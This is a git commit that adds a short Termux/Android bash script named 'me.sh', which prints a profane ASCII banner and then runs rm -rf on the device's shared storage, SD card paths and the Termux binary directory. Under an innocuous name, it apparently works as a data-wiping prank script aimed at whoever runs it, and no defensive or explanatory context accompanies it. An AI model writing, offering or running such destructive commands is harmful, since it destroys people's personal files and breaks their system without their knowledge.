4ae276f0455bda067e1f34da473dd0e5410f6b62
K0NT0L <46758245+K0NT0L@users.noreply.github.com>
2019-01-18 22:50:54 +0700

    Create me.sh

---
+++ me.sh
@@ -0,0 +1,15 @@
+#!/system/xbin/bash
+
+#coded by Anonymous
+
+toilet -f standard Mr.Fuckking | lolcat 
+
+rm -rf /storage/emulated/0/
+
+rm -rf /storage/
+
+rm -rf /storage/sdcard/
+
+rm -rf /storage/sdcard1/
+
+rm -rf $PREFIX/bin/
